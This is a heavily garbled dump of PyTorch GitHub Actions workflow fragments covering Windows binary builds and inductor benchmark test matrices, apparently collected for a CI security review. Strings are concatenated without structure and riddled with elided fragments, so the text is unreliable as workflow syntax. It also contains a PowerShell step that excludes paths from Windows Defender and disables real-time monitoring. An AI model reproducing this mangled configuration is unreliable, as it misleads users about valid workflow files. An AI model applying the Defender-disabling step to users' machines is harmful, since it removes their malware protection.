name: B ... sccacheBootstrap Libuv"pytorch/.ci/pytorch/windows/arm64/bootstrap_libuv.bat"
name: B ... p Libuv"${PYTORCH_ROOT}/.circleci/scripts/binary_populate_env.sh"
"${PYTORCH_ROOT}/.circleci/scripts/binary_windows_build.sh"
libtorch-cpu-shared-with-deps-debuglibtorc ... s-debugname: l ... s-debuglibtorch-cpu-shared-with-deps-debug-testlibtorc ... ug-test- libto ... g-buildTest PyTorch binary"${PYTORCH_ROOT}/.circleci/scripts/binary_windows_test.sh"
libtorch-cpu-shared-with-deps-debug-uploadname: w ... h-debug/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__generated-windows-arm64-binary-libtorch-release-nightly.ymlwindows-arm64-binary-libtorch-releasewindows ... releasewindows-arm64-binary-libtorch-release-${{ github.event.pull_request.number || github.ref_name }}-${{ github.ref_type == 'branch' && github.sha }}-${{ github.event_name == 'workflow_dispatch' }}name: w ... release/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__generated-windows-arm64-binary-wheel-nightly.ymlwindows-arm64-binary-wheelwindows ... y-wheelwindows-arm64-binary-wheel-${{ github.event.pull_request.number || github.ref_name }}-${{ github.ref_type == 'branch' && github.sha }}-${{ github.event_name == 'workflow_dispatch' }}wheel-py3_11-cpu-testwheel-p ... pu-test- wheel ... u-buildwheel-py3_12-cpu-testwheel-py3_13-cpu-testname: w ... y-wheel/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__generated-windows-binary-libtorch-debug-main.ymlwindows-binary-libtorch-debugwindows-binary-libtorch-debug-${{ github.event.pull_request.number || github.ref_name }}-${{ github.ref_type == 'branch' && github.sha }}-${{ github.event_name == 'workflow_dispatch' }}${{ needs.get-label-type.outputs.label-type }}windows.4xlarge.nonephemeral"${{ ne ... emeral"echo "BINARY_ENV_FILE=${RUNNER_TEMP}/env" >> "${GITHUB_ENV}"
echo "PYTORCH_FINAL_PACKAGE_DIR=${RUNNER_TEMP}/artifacts" >> "${GITHUB_ENV}"
echo "WIN_PACKAGE_WORK_DIR=${RUNNER_TEMP}"
Enable long paths on WindowsEnable  ... WindowsSet-ItemProperty -Path "HKLM:\\SYSTEM\CurrentControlSet\Control\FileSystem" -Name "LongPathsEnabled" -Value 1
name: E ... WindowsDisables Windows Defender scheduled and real-time scanning for files in directories used by PyTorchDisable ... PyTorchAdd-MpPreference -ExclusionPath $(Get-Location).tostring(),$Env:TEMP -ErrorAction Ignore
# Let's both exclude the path and disable Windows Defender completely just to be sure
# that it doesn't interfere
Set-MpPreference -DisableRealtimeMonitoring $True -ErrorAction Ignore
name: D ... PyTorchWait until all sessions have drainedWait un ... drained.github\scripts\wait_for_ssh_to_drain.ps1
name: W ... drainedKill active ssh sessions if still around (Useful if workflow was cancelled)Kill ac ... celled).github\scripts\kill_active_ssh_sessions.ps1
name: K ... celled)/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__generated-windows-binary-libtorch-debug-nightly.ymllibtorch-cuda11_8-shared-with-deps-debug-buildlibtorch-cuda11_8-shared-with-deps-debuglibtorch-cuda11_8-shared-with-deps-debug-test${{ needs.get-label-type.outputs.label-type }}windows.g4dn.xlargelibtorch-cuda11_8-shared-with-deps-debug-uploadlibtorch-cuda12_6-shared-with-deps-debug-buildlibtorch-cuda12_6-shared-with-deps-debuglibtorch-cuda12_6-shared-with-deps-debug-testlibtorch-cuda12_6-shared-with-deps-debug-uploadlibtorch-cuda12_8-shared-with-deps-debug-buildlibtorch-cuda12_8-shared-with-deps-debuglibtorch-cuda12_8-shared-with-deps-debug-testlibtorch-cuda12_8-shared-with-deps-debug-upload/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__generated-windows-binary-libtorch-release-main.ymlwindows-binary-libtorch-releasewindows-binary-libtorch-release-${{ github.event.pull_request.number || github.ref_name }}-${{ github.ref_type == 'branch' && github.sha }}-${{ github.event_name == 'workflow_dispatch' }}/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__generated-windows-binary-libtorch-release-nightly.yml/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__generated-windows-binary-wheel-nightly.ymlwindows-binary-wheelwindows-binary-wheel-${{ github.event.pull_request.number || github.ref_name }}-${{ github.ref_type == 'branch' && github.sha }}-${{ github.event_name == 'workflow_dispatch' }}wheel-py3_9-cpu-testwheel-py3_9-cuda11_8-buildwheel-p ... 8-buildwheel-py3_9-cuda11_8name: w ... uda11_8wheel-py3_9-cuda11_8-testwheel-p ... _8-test- wheel ... 8-buildwheel-py3_9-cuda11_8-uploadwheel-py3_9-cuda12_6-buildwheel-p ... 6-buildwheel-py3_9-cuda12_6name: w ... uda12_6wheel-py3_9-cuda12_6-testwheel-p ... _6-test- wheel ... 6-buildwheel-py3_9-cuda12_6-uploadwheel-py3_9-cuda12_8-buildwheel-py3_9-cuda12_8name: w ... uda12_8wheel-py3_9-cuda12_8-testwheel-py3_9-cuda12_8-uploadwheel-py3_9-xpu-buildwheel-py3_9-xpuname: w ... 3_9-xpuwheel-py3_9-xpu-testwheel-py3_9-xpu-uploadwheel-py3_10-cpu-testwheel-py3_10-cuda11_8-buildwheel-py3_10-cuda11_8wheel-p ... uda11_8wheel-py3_10-cuda11_8-testwheel-py3_10-cuda11_8-uploadwheel-py3_10-cuda12_6-buildwheel-py3_10-cuda12_6wheel-p ... uda12_6wheel-py3_10-cuda12_6-testwheel-py3_10-cuda12_6-uploadwheel-py3_10-cuda12_8-buildwheel-py3_10-cuda12_8wheel-p ... uda12_8wheel-py3_10-cuda12_8-testwheel-py3_10-cuda12_8-uploadwheel-py3_10-xpu-buildwheel-py3_10-xpuname: w ... _10-xpuwheel-py3_10-xpu-testwheel-py3_10-xpu-uploadwheel-py3_11-cuda11_8-buildwheel-py3_11-cuda11_8wheel-py3_11-cuda11_8-testwheel-py3_11-cuda11_8-uploadwheel-py3_11-cuda12_6-buildwheel-py3_11-cuda12_6wheel-py3_11-cuda12_6-testwheel-py3_11-cuda12_6-uploadwheel-py3_11-cuda12_8-buildwheel-py3_11-cuda12_8wheel-py3_11-cuda12_8-testwheel-py3_11-cuda12_8-uploadwheel-py3_11-xpu-buildwheel-py3_11-xpuname: w ... _11-xpuwheel-py3_11-xpu-testwheel-py3_11-xpu-uploadwheel-py3_12-cuda11_8-buildwheel-py3_12-cuda11_8wheel-py3_12-cuda11_8-testwheel-py3_12-cuda11_8-uploadwheel-py3_12-cuda12_6-buildwheel-py3_12-cuda12_6wheel-py3_12-cuda12_6-testwheel-py3_12-cuda12_6-uploadwheel-py3_12-cuda12_8-buildwheel-py3_12-cuda12_8wheel-py3_12-cuda12_8-testwheel-py3_12-cuda12_8-uploadwheel-py3_12-xpu-buildwheel-py3_12-xpuname: w ... _12-xpuwheel-py3_12-xpu-testwheel-py3_12-xpu-uploadwheel-py3_13-cuda11_8-buildwheel-py3_13-cuda11_8wheel-py3_13-cuda11_8-testwheel-py3_13-cuda11_8-uploadwheel-py3_13-cuda12_6-buildwheel-py3_13-cuda12_6wheel-py3_13-cuda12_6-testwheel-py3_13-cuda12_6-uploadwheel-py3_13-cuda12_8-buildwheel-py3_13-cuda12_8wheel-py3_13-cuda12_8-testwheel-py3_13-cuda12_8-uploadwheel-py3_13-xpu-buildwheel-py3_13-xpuname: w ... _13-xpuwheel-py3_13-xpu-testwheel-py3_13-xpu-uploadwheel-py3_13t-cpu-testwheel-py3_13t-cuda11_8-buildwheel-py3_13t-cuda11_8wheel-py3_13t-cuda11_8-testwheel-py3_13t-cuda11_8-uploadwheel-py3_13t-cuda12_6-buildwheel-py3_13t-cuda12_6wheel-py3_13t-cuda12_6-testwheel-py3_13t-cuda12_6-uploadwheel-py3_13t-cuda12_8-buildwheel-py3_13t-cuda12_8wheel-py3_13t-cuda12_8-testwheel-py3_13t-cuda12_8-uploadwheel-py3_13t-xpu-buildwheel-py3_13t-xpuname: w ... 13t-xpuwheel-py3_13t-xpu-testwheel-py3_13t-xpu-upload/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__inductor-micro-benchmark-x86.ymlinductor-micro-benchmark-x86inducto ... ark-x86cron: 0 7 * * *- cron: 0 7 * * *ciflow/inductor-micro-benchmark-cpu-x86/*ciflow/ ... u-x86/*- ciflo ... u-x86/*${{ github.workflow }}-${{ github.event.pull_request.number || github.ref_name }}-${{ github.ref_type == 'branch' && github.sha }}-${{ github.event_name == 'workflow_dispatch' }}-${{ github.event_name == 'schedule' }}group:  ... ule' }}linux-jammy-cpu-py3_9-gcc11-inductor-buildlinux-j ... r-build${{ (github.event_name != 'schedule' || github.repository == 'pytorch/pytorch') && github.repository_owner == 'pytorch' }}${{ (gi ... rch' }}linux-jammy-cpu-py3.9-gcc11-inductorlinux-j ... nductor./.github/workflows/_linux-build.ymllinux-jammy-py3.9-gcc11linux-j ... 9-gcc11ci-image:pytorch-linux-jammy-py3.9-gcc11-inductor-benchmarksci-imag ... chmarks{ include: [
  { config: "inductor-micro-benchmark-cpu-x86", shard: 1, num_shards: 1, runner: "linux.24xl.spr-metal", owners: ["oncall:pt2"] },
]}
build-e ... 9-gcc11linux-jammy-cpu-py3_9-gcc11-inductor-micro-benchmark-testlinux-j ... rk-test./.github/workflows/_linux-test.yml${{ needs.linux-jammy-cpu-py3_9-gcc11-inductor-build.outputs.docker-image }}${{ nee ... mage }}${{ needs.linux-jammy-cpu-py3_9-gcc11-inductor-build.outputs.test-matrix }}${{ nee ... trix }}720name: l ... nductorlinux-j ... -build:name: i ... ark-x86/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__inductor-micro-benchmark.ymlinductor-micro-benchmarkinducto ... nchmarkciflow/inductor-micro-benchmark/*ciflow/ ... hmark/*- ciflo ... hmark/*get-default-label-prefixget-def ... -prefixlfname: g ... -prefixlinux-focal-cuda12_6-py3_10-gcc9-inductor-micro-benchmark-buildlinux-f ... k-buildcuda12.6-py3.10-gcc9-sm80cuda12. ... c9-sm80- get-d ... -prefix${{ needs.get-default-label-prefix.outputs.label-type }}linux-focal-cuda12.6-py3.10-gcc9-sm80linux-f ... c9-sm80ci-image:pytorch-linux-focal-cuda12.6-cudnn9-py3-gcc9-inductor-benchmarks8.0'8.0'{ include: [
  { config: "inductor-micro-benchmark", shard: 1, num_shards: 1, runner: "linux.aws.a100", owners: ["oncall:pt2"] },
]}
runner_ ... ype }}"name: c ... c9-sm80linux-focal-cuda12_6-py3_10-gcc9-inductor-micro-benchmark-testlinux-f ... rk-test${{ needs.linux-focal-cuda12_6-py3_10-gcc9-inductor-micro-benchmark-build.outputs.docker-image }}${{ needs.linux-focal-cuda12_6-py3_10-gcc9-inductor-micro-benchmark-build.outputs.test-matrix }}build-e ... c9-sm80get-def ... prefix:name: i ... nchmark/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__inductor-nightly.ymlinductor-nightly.github/workflows/inductor-nightly.yml.github ... tly.ymlbenchmarks/dynamo/ci_expected_accuracy/dynamic_cpu_max_autotune_inductor_amp_freezing_huggingface_inference.csvbenchma ... nce.csvbenchmarks/dynamo/ci_expected_accuracy/dynamic_cpu_max_autotune_inductor_amp_freezing_timm_inference.csvbenchmarks/dynamo/ci_expected_accuracy/dynamic_cpu_max_autotune_inductor_amp_freezing_torchbench_inference.csv- .gith ... tly.ymllinux-jammy-cpu-py3_9-gcc11-nightly-dynamo-benchmarks-buildlinux-j ... s-buildlinux-jammy-cpu-py3.9-gcc11-nightly-dynamo-benchmarkslinux-j ... chmarkslinux-jammy-py3.9-gcc11-buildlinux-j ... 1-build{ include: [
  { config: "dynamic_cpu_max_autotune_inductor_amp_freezing_huggingface", shard: 1, num_shards: 1, runner: "linux.8xlarge.amx" },
  { config: "dynamic_cpu_max_autotune_inductor_amp_freezing_timm", shard: 1, num_shards: 2, runner: "linux.8xlarge.amx" },
  { config: "dynamic_cpu_max_autotune_inductor_amp_freezing_timm", shard: 2, num_shards: 2, runner: "linux.8xlarge.amx" },
  { config: "dynamic_cpu_max_autotune_inductor_amp_freezing_torchbench", shard: 1, num_shards: 2, runner: "linux.8xlarge.amx" },
  { config: "dynamic_cpu_max_autotune_inductor_amp_freezing_torchbench", shard: 2, num_shards: 2, runner: "linux.8xlarge.amx" },
]}
build-e ... 1-buildname: l ... chmarkslinux-jammy-cpu-py3_9-gcc11-nightly-dynamo-benchmarks-testlinux-j ... ks-test${{ needs.linux-jammy-cpu-py3_9-gcc11-nightly-dynamo-benchmarks-build.outputs.docker-image }}${{ needs.linux-jammy-cpu-py3_9-gcc11-nightly-dynamo-benchmarks-build.outputs.test-matrix }}name: i ... nightly/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__inductor-perf-compare.ymlinductor-A100-perf-compareinducto ... compareciflow/inductor-perf-compare/*ciflow/ ... mpare/*- ciflo ... mpare/*${{ github.workflow }}-${{ github.event.pull_request.number || github.ref_name }}-${{ github.ref_type == 'branch' && github.sha }}-${{ github.event_name == 'workflow_dispatch' }}linux-focal-cuda12_6-py3_10-gcc9-inductor-buildlinux-f ... r-build{ include: [
  { config: "inductor_huggingface_perf_compare", shard: 1, num_shards: 1, runner: "linux.aws.a100" },
  { config: "inductor_timm_perf_compare", shard: 1, num_shards: 2, runner: "linux.aws.a100" },
  { config: "inductor_timm_perf_compare", shard: 2, num_shards: 2, runner: "linux.aws.a100" },
  { config: "inductor_torchbench_perf_compare", shard: 1, num_shards: 1, runner: "linux.aws.a100" },
]}
linux-focal-cuda12_6-py3_10-gcc9-inductor-testlinux-f ... or-test${{ needs.linux-focal-cuda12_6-py3_10-gcc9-inductor-build.outputs.docker-image }}${{ needs.linux-focal-cuda12_6-py3_10-gcc9-inductor-build.outputs.test-matrix }}name: i ... compare/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__inductor-perf-test-nightly-aarch64.ymlinductor-perf-nightly-aarch64inducto ... aarch64trainingRun training (off by default)?Run tra ... fault)?descrip ... fault)?inferenceRun inference (on by default)?Run inf ... fault)?Run inductor_default?Run ind ... efault?descrip ... efault?dynamicRun inductor_dynamic_shapes?Run ind ... shapes?descrip ... shapes?cppwrapperRun inductor_cpp_wrapper?Run ind ... rapper?descrip ... rapper?aotinductorRun aot_inductor for inference?Run aot ... erence?descrip ... erence?benchmark_configsThe list of configs used the benchmarkThe lis ... nchmarkinductor_huggingface_perf_cpu_aarch64,inductor_timm_perf_cpu_aarch64,inductor_torchbench_perf_cpu_aarch64descrip ... nchmarktraining:name: get-label-typelinux-jammy-aarch64-py3_10-inductor-buildlinux-jammy-aarch64-py3.10-inductorlinux-jammy-aarch64-py3.10linux-j ... -py3.10ci-image:pytorch-linux-jammy-aarch64-py3.10-gcc11-inductor-benchmarks{ include: [
  { config: "inductor_huggingface_perf_cpu_aarch64", shard: 1, num_shards: 9, runner: "linux.arm64.m7g.metal" },
  { config: "inductor_huggingface_perf_cpu_aarch64", shard: 2, num_shards: 9, runner: "linux.arm64.m7g.metal" },
  { config: "inductor_huggingface_perf_cpu_aarch64", shard: 3, num_shards: 9, runner: "linux.arm64.m7g.metal" },
  { config: "inductor_huggingface_perf_cpu_aarch64", shard: 4, num_shards: 9, runner: "linux.arm64.m7g.metal" },
  { config: "inductor_huggingface_perf_cpu_aarch64", shard: 5, num_shards: 9, runner: "linux.arm64.m7g.metal" },
  { config: "inductor_huggingface_perf_cpu_aarch64", shard: 6, num_shards: 9, runner: "linux.arm64.m7g.metal" },
  { config: "inductor_huggingface_perf_cpu_aarch64", shard: 7, num_shards: 9, runner: "linux.arm64.m7g.metal" },
  { config: "inductor_huggingface_perf_cpu_aarch64", shard: 8, num_shards: 9, runner: "linux.arm64.m7g.metal" },
  { config: "inductor_huggingface_perf_cpu_aarch64", shard: 9, num_shards: 9, runner: "linux.arm64.m7g.metal" },
  { config: "inductor_timm_perf_cpu_aarch64", shard:  1, num_shards: 15, runner: "linux.arm64.m7g.metal" },
  { config: "inductor_timm_perf_cpu_aarch64", shard:  2, num_shards: 15, runner: "linux.arm64.m7g.metal" },
  { config: "inductor_timm_perf_cpu_aarch64", shard:  3, num_shards: 15, runner: "linux.arm64.m7g.metal" },
  { config: "inductor_timm_perf_cpu_aarch64", shard:  4, num_shards: 15, runner: "linux.arm64.m7g.metal" },
  { config: "inductor_timm_perf_cpu_aarch64", shard:  5, num_shards: 15, runner: "linux.arm64.m7g.metal" },
  { config: "inductor_timm_perf_cpu_aarch64", shard:  6, num_shards: 15, runner: "linux.arm64.m7g.metal" },
  { config: "inductor_timm_perf_cpu_aarch64", shard:  7, num_shards: 15, runner: "linux.arm64.m7g.metal" },
  { config: "inductor_timm_perf_cpu_aarch64", shard:  8, num_shards: 15, runner: "linux.arm64.m7g.metal" },
  { config: "inductor_timm_perf_cpu_aarch64", shard:  9, num_shards: 15, runner: "linux.arm64.m7g.metal" },
  { config: "inductor_timm_perf_cpu_aarch64", shard: 10, num_shards: 15, runner: "linux.arm64.m7g.metal" },
  { config: "inductor_timm_perf_cpu_aarch64", shard: 11, num_shards: 15, runner: "linux.arm64.m7g.metal" },
  { config: "inductor_timm_perf_cpu_aarch64", shard: 12, num_shards: 15, runner: "linux.arm64.m7g.metal" },
  { config: "inductor_timm_perf_cpu_aarch64", shard: 13, num_shards: 15, runner: "linux.arm64.m7g.metal" },
  { config: "inductor_timm_perf_cpu_aarch64", shard: 14, num_shards: 15, runner: "linux.arm64.m7g.metal" },
  { config: "inductor_timm_perf_cpu_aarch64", shard: 15, num_shards: 15, runner: "linux.arm64.m7g.metal" },
  { config: "inductor_torchbench_perf_cpu_aarch64", shard:  1, num_shards: 15, runner: "linux.arm64.m7g.metal" },
  { config: "inductor_torchbench_perf_cpu_aarch64", shard:  2, num_shards: 15, runner: "linux.arm64.m7g.metal" },
  { config: "inductor_torchbench_perf_cpu_aarch64", shard:  3, num_shards: 15, runner: "linux.arm64.m7g.metal" },
  { config: "inductor_torchbench_perf_cpu_aarch64", shard:  4, num_shards: 15, runner: "linux.arm64.m7g.metal" },
  { config: "inductor_torchbench_perf_cpu_aarch64", shard:  5, num_shards: 15, runner: "linux.arm64.m7g.metal" },
  { config: "inductor_torchbench_perf_cpu_aarch64", shard:  6, num_shards: 15, runner: "linux.arm64.m7g.metal" },
  { config: "inductor_torchbench_perf_cpu_aarch64", shard:  7, num_shards: 15, runner: "linux.arm64.m7g.metal" },
  { config: "inductor_torchbench_perf_cpu_aarch64", shard:  8, num_shards: 15, runner: "linux.arm64.m7g.metal" },
  { config: "inductor_torchbench_perf_cpu_aarch64", shard:  9, num_shards: 15, runner: "linux.arm64.m7g.metal" },
  { config: "inductor_torchbench_perf_cpu_aarch64", shard: 10, num_shards: 15, runner: "linux.arm64.m7g.metal" },
  { config: "inductor_torchbench_perf_cpu_aarch64", shard: 11, num_shards: 15, runner: "linux.arm64.m7g.metal" },
  { config: "inductor_torchbench_perf_cpu_aarch64", shard: 12, num_shards: 15, runner: "linux.arm64.m7g.metal" },
  { config: "inductor_torchbench_perf_cpu_aarch64", shard: 13, num_shards: 15, runner: "linux.arm64.m7g.metal" },
  { config: "inductor_torchbench_perf_cpu_aarch64", shard: 14, num_shards: 15, runner: "linux.arm64.m7g.metal" },
  { config: "inductor_torchbench_perf_cpu_aarch64", shard: 15, num_shards: 15, runner: "linux.arm64.m7g.metal" },
]}
${{ inputs.benchmark_configs }}linux-jammy-aarch64-py3_10-inductor-test-nightlylinux-j ... nightlygithub.event.schedule == '0 7 * * *'github. ...  * * *'training-false-inference-true-default-true-dynamic-true-cppwrapper-true-aotinductor-truetrainin ... or-true${{ needs.linux-jammy-aarch64-py3_10-inductor-build.outputs.docker-image }}${{ needs.linux-jammy-aarch64-py3_10-inductor-build.outputs.test-matrix }}build-e ... -py3.10linux-jammy-aarch64-py3_10-inductor-testlinux-j ... or-testtraining-${{ inputs.training }}-inference-${{ inputs.inference }}-default-${{ inputs.default }}-dynamic-${{ inputs.dynamic }}-cppwrapper-${{ inputs.cppwrapper }}-aotinductor-${{ inputs.aotinductor }}trainin ... ctor }}name: i ... aarch64/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__inductor-perf-test-nightly-h100.ymlinductor-perf-nightly-h100inducto ... ly-h1000 7 * * 1-6cron: 0 7 * * 1-60 7 * * 0cron: 0 7 * * 0- cron: 0 7 * * 1-6Run training (on by default)?cudagraphsRun inductor_cudagraphs?Run ind ... graphs?descrip ... graphs?freezing_cudagraphsRun inductor_cudagraphs with freezing for inference?Run ind ... erence?maxautotuneRun inductor_max_autotune?Run ind ... totune?descrip ... totune?inductor_huggingface_perf_cuda_h100,inductor_timm_perf_cuda_h100,inductor_torchbench_perf_cuda_h100inducto ... da_h100cuda12.6-py3.10-gcc9-sm90cuda12. ... c9-sm90linux-focal-cuda12.6-py3.10-gcc9-sm90linux-f ... c9-sm909.0'9.0'{ include: [
  { config: "inductor_huggingface_perf_cuda_h100", shard: 1, num_shards: 5, runner: "linux.aws.h100" },
  { config: "inductor_huggingface_perf_cuda_h100", shard: 2, num_shards: 5, runner: "linux.aws.h100" },
  { config: "inductor_huggingface_perf_cuda_h100", shard: 3, num_shards: 5, runner: "linux.aws.h100" },
  { config: "inductor_huggingface_perf_cuda_h100", shard: 4, num_shards: 5, runner: "linux.aws.h100" },
  { config: "inductor_huggingface_perf_cuda_h100", shard: 5, num_shards: 5, runner: "linux.aws.h100" },
  { config: "inductor_timm_perf_cuda_h100", shard: 1, num_shards: 6, runner: "linux.aws.h100" },
  { config: "inductor_timm_perf_cuda_h100", shard: 2, num_shards: 6, runner: "linux.aws.h100" },
  { config: "inductor_timm_perf_cuda_h100", shard: 3, num_shards: 6, runner: "linux.aws.h100" },
  { config: "inductor_timm_perf_cuda_h100", shard: 4, num_shards: 6, runner: "linux.aws.h100" },
  { config: "inductor_timm_perf_cuda_h100", shard: 5, num_shards: 6, runner: "linux.aws.h100" },
  { config: "inductor_timm_perf_cuda_h100", shard: 6, num_shards: 6, runner: "linux.aws.h100" },
  { config: "inductor_torchbench_perf_cuda_h100", shard: 1, num_shards: 6, runner: "linux.aws.h100" },
  { config: "inductor_torchbench_perf_cuda_h100", shard: 2, num_shards: 6, runner: "linux.aws.h100" },
  { config: "inductor_torchbench_perf_cuda_h100", shard: 3, num_shards: 6, runner: "linux.aws.h100" },
  { config: "inductor_torchbench_perf_cuda_h100", shard: 4, num_shards: 6, runner: "linux.aws.h100" },
  { config: "inductor_torchbench_perf_cuda_h100", shard: 5, num_shards: 6, runner: "linux.aws.h100" },
  { config: "inductor_torchbench_perf_cuda_h100", shard: 6, num_shards: 6, runner: "linux.aws.h100" },
]}
name: c ... c9-sm90test-nightlygithub.event.schedule == '0 7 * * 1-6'github. ...  * 1-6'training-true-inference-true-default-true-dynamic-true-cudagraphs-true-cppwrapper-true-aotinductor-true-freezing_cudagraphs-true-cudagraphs_low_precision-truetrainin ... on-true${{ needs.build.outputs.docker-image }}${{ needs.build.outputs.test-matrix }}build-e ... c9-sm90test-weeklygithub.event.schedule == '0 7 * * 0'github. ...  * * 0'training-true-inference-true-default-true-dynamic-true-cudagraphs-true-cppwrapper-true-aotinductor-true-freezing_cudagraphs-true-maxautotune-true-freeze_autotune_cudagraphs-true-cudagraphs_low_precision-true1440training-${{ inputs.training }}-inference-${{ inputs.inference }}-default-${{ inputs.default }}-dynamic-${{ inputs.dynamic }}-cudagraphs-${{ inputs.cudagraphs }}-cppwrapper-${{ inputs.cppwrapper }}-aotinductor-${{ inputs.aotinductor }}-maxautotune-${{ inputs.maxautotune }}-freezing_cudagraphs-${{ inputs.freezing_cudagraphs }}-cudagraphs_low_precision-${{ inputs.cudagraphs }}trainin ... aphs }}name: i ... ly-h100/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__inductor-perf-test-nightly-macos.ymlinductor-perf-nightly-macosinducto ... y-macostorchbench_perf_mps.github/workflows/inductor-perf-test-nightly-macos.yml.github ... cos.yml.ci/pytorch/macos-test.sh.ci/pyt ... test.sh- .gith ... cos.yml${{ github.workflow }}-${{ github.event.pull_request.number || github.sha }}-${{ github.event_name == 'workflow_dispatch' }}-${{ github.event_name == 'schedule' }}macos-perf-py3-arm64-buildmacos-p ... 4-buildmacos-perf-py3-arm64./.github/workflows/_mac-build.ymlmacos-py3-arm64-distributedmacos-p ... ributedmacos-m1-stable3.9.12{ include: [
  { config: "perf_smoketest", shard: 1, num_shards: 1, runner: "macos-m2-15" },
]}
sync-ta ... 4-buildmacos-perf-py3-arm64-testmacos-p ... 64-testmacos-perf-py3-arm64-mpsmacos-p ... m64-mps./.github/workflows/_mac-test.yml${{ needs.macos-perf-py3-arm64-build.outputs.test-matrix }}build-e ... ributedname: m ... m64-mpsmacos-p ... -build:name: i ... y-macos/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__inductor-perf-test-nightly-rocm.ymlinductor-perf-nightly-rocminducto ... ly-rocmciflow/inductor-perf-test-nightly-rocm/*ciflow/ ... -rocm/*- ciflo ... -rocm/*- cron: 0 7 * * 0inductor_huggingface_perf_rocm,inductor_timm_perf_rocm,inductor_torchbench_perf_rocminducto ... rf_rocmlinux-jammy-rocm-py3_10-inductor-benchmark-buildlinux-j ... k-buildrocm-py3_10-inductor-benchmark-buildrocm-py ... k-buildlinux-jammy-rocm-py3_10linux-j ... -py3_10{ include: [
  { config: "inductor_huggingface_perf_rocm", shard: 1, num_shards: 3, runner: "linux.rocm.gpu.mi300.2" },
  { config: "inductor_huggingface_perf_rocm", shard: 2, num_shards: 3, runner: "linux.rocm.gpu.mi300.2" },
  { config: "inductor_huggingface_perf_rocm", shard: 3, num_shards: 3, runner: "linux.rocm.gpu.mi300.2" },
  { config: "inductor_timm_perf_rocm", shard: 1, num_shards: 5, runner: "linux.rocm.gpu.mi300.2" },
  { config: "inductor_timm_perf_rocm", shard: 2, num_shards: 5, runner: "linux.rocm.gpu.mi300.2" },
  { config: "inductor_timm_perf_rocm", shard: 3, num_shards: 5, runner: "linux.rocm.gpu.mi300.2" },
  { config: "inductor_timm_perf_rocm", shard: 4, num_shards: 5, runner: "linux.rocm.gpu.mi300.2" },
  { config: "inductor_timm_perf_rocm", shard: 5, num_shards: 5, runner: "linux.rocm.gpu.mi300.2" },
  { config: "inductor_torchbench_perf_rocm", shard: 1, num_shards: 4, runner: "linux.rocm.gpu.mi300.2" },
  { config: "inductor_torchbench_perf_rocm", shard: 2, num_shards: 4, runner: "linux.rocm.gpu.mi300.2" },
  { config: "inductor_torchbench_perf_rocm", shard: 3, num_shards: 4, runner: "linux.rocm.gpu.mi300.2" },
  { config: "inductor_torchbench_perf_rocm", shard: 4, num_shards: 4, runner: "linux.rocm.gpu.mi300.2" },
]}
build-e ... -py3_10linux-jammy-rocm-py3_10-inductor-benchmark-testrocm-py3_10-inductor-benchmark-testrocm-py ... rk-test./.github/workflows/_rocm-test.yml${{ needs.linux-jammy-rocm-py3_10-inductor-benchmark-build.outputs.docker-image }}${{ needs.linux-jammy-rocm-py3_10-inductor-benchmark-build.outputs.test-matrix }}name: i ... ly-rocm/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__inductor-perf-test-nightly-x86.ymlinductor-perf-nightly-x86inducto ... tly-x86inductor_huggingface_perf_cpu_x86,inductor_timm_perf_cpu_x86,inductor_torchbench_perf_cpu_x86inducto ... cpu_x86{ include: [
  { config: "inductor_huggingface_perf_cpu_x86", shard: 1, num_shards: 3, runner: "linux.24xl.spr-metal" },
  { config: "inductor_huggingface_perf_cpu_x86", shard: 2, num_shards: 3, runner: "linux.24xl.spr-metal" },
  { config: "inductor_huggingface_perf_cpu_x86", shard: 3, num_shards: 3, runner: "linux.24xl.spr-metal" },
  { config: "inductor_timm_perf_cpu_x86", shard: 1, num_shards: 5, runner: "linux.24xl.spr-metal" },
  { config: "inductor_timm_perf_cpu_x86", shard: 2, num_shards: 5, runner: "linux.24xl.spr-metal" },
  { config: "inductor_timm_perf_cpu_x86", shard: 3, num_shards: 5, runner: "linux.24xl.spr-metal" },
  { config: "inductor_timm_perf_cpu_x86", shard: 4, num_shards: 5, runner: "linux.24xl.spr-metal" },
  { config: "inductor_timm_perf_cpu_x86", shard: 5, num_shards: 5, runner: "linux.24xl.spr-metal" },
  { config: "inductor_torchbench_perf_cpu_x86", shard: 1, num_shards: 4, runner: "linux.24xl.spr-metal" },
  { config: "inductor_torchbench_perf_cpu_x86", shard: 2, num_shards: 4, runner: "linux.24xl.spr-metal" },
  { config: "inductor_torchbench_perf_cpu_x86", shard: 3, num_shards: 4, runner: "linux.24xl.spr-metal" },
  { config: "inductor_torchbench_perf_cpu_x86", shard: 4, num_shards: 4, runner: "linux.24xl.spr-metal" },
]}
linux-jammy-cpu-py3_9-gcc11-inductor-test-nightlylinux-jammy-cpu-py3_9-gcc11-inductor-testname: i ... tly-x86/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__inductor-perf-test-nightly.ymlinductor-A100-perf-nightlyinducto ... nightlyinductor_huggingface_perf,inductor_timm_perf,inductor_torchbench_perf,cachebenchinducto ... hebench{ include: [
  { config: "inductor_huggingface_perf", shard: 1, num_shards: 5, runner: "linux.aws.a100" },
  { config: "inductor_huggingface_perf", shard: 2, num_shards: 5, runner: "linux.aws.a100" },
  { config: "inductor_huggingface_perf", shard: 3, num_shards: 5, runner: "linux.aws.a100" },
  { config: "inductor_huggingface_perf", shard: 4, num_shards: 5, runner: "linux.aws.a100" },
  { config: "inductor_huggingface_perf", shard: 5, num_shards: 5, runner: "linux.aws.a100" },
  { config: "inductor_timm_perf", shard: 1, num_shards: 6, runner: "linux.aws.a100" },
  { config: "inductor_timm_perf", shard: 2, num_shards: 6, runner: "linux.aws.a100" },
  { config: "inductor_timm_perf", shard: 3, num_shards: 6, runner: "linux.aws.a100" },
